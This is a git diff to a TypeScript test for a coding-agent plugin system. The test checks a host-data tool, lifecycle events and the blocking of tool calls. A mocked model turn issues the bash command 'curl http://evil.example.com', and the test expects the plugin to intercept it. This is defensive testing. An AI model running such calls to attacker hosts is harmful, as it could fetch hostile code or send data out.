@@ -10,18 +10,21 @@
  */
 
 import { test } from "node:test";
+import { Type } from "typebox";
+import { defineTool } from "@earendil-works/pi-coding-agent";
 import assert from "node:assert/strict";
-import { setupSession, teardownSession } from "../src/setup.ts";
+import { setupSession,teardownSession } from "../src/setup.ts";
 import { readSessionFile } from "../src/helpers.ts";
 
 test("可信插件：宿主数据工具、tool_call 阻断、生命周期订阅、状态持久化", async () => {
   const lifecycle: string[] = [];
   const blocked: string[] = [];
   let hostData: string | undefined;
+  const executed: Array<{ id: string; input: string }> = [];
 
   const s = await setupSession("plugin", (req, callIndex) => {
     if (callIndex === 0) {
-      return { kind: "tool_calls", calls: [{ id: "call_h1", name: "host_history", arguments: {} }] };
+      return { kind: "tool_calls", calls: [{ id: "call_h1", name: "host_history", arguments: { input: "hello-host" } }] };
     }
     if (callIndex === 1) {
       return { kind: "tool_calls", calls: [{ id: "call_b1", name: "bash", arguments: { command: "curl http://evil.example.com" } }] };
@@ -57,16 +60,17 @@ test("可信插件：宿主数据工具、tool_call 阻断、生命周期订阅�
       },
     ],
     customTools: [
-      {
+      defineTool({
         name: "host_history",
         label: "Host History",
         description: "读取当前会话历史条数",
-        parameters: { type: "object" as const, properties: {}, required: [] as string[] },
-        execute: async () => {
+        parameters: Type.Object({ input: Type.String() }),
+        execute: async (id, params) => {
+          executed.push({ id, input: params.input });
           hostData = `count=${s.session.messages.length}`;
           return { content: [{ type: "text", text: `history:${hostData}` }], details: {} };
         },
-      } as any,
+      }),
     ],
   });
   try {
@@ -79,6 +83,10 @@ test("可信插件：宿主数据工具、tool_call 阻断、生命周期订阅�
     const messages = s.session.messages as any[];
     const toolResult = messages.find((m) => m.role === "toolResult" && m.toolName === "host_history");
     assert.ok(toolResult, "历史中应有 host_history 的结果");
+    assert.deepEqual(executed, [{ id: "call_h1", input: "hello-host" }]);
+    const call = messages.flatMap(message => message.role === "assistant" ? message.content ?? [] : []).find(part => part.type === "toolCall" && part.name === "host_history");
+    assert.ok(call); assert.equal(toolResult.toolCallId, call.id);
+    assert.ok(s.server.calls[1].messages.some(message => message.role === "tool" && JSON.stringify(message).includes(`history:${hostData}`)));
     assert.ok(JSON.stringify(toolResult.content).includes("count="), "工具结果应包含宿主读取的数据");
 
     // 2. tool_call 阻断：bash 被拦截，产生错误结果消息，而不是执行
